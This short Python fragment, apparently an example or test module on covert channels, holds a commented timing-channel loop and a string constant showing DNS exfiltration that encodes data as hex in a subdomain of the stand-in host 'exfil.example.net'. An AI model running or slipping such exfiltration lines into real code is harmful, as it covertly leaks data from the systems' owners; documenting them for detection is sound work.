# for bit in format(byte, "08b"): time.sleep(0.4 if bit == "1" else 0.1)
EXAMPLE = 'socket.gethostbyname(f"{data.hex()}.exfil.example.net")'


def describe() -> str:
    return EXAMPLE
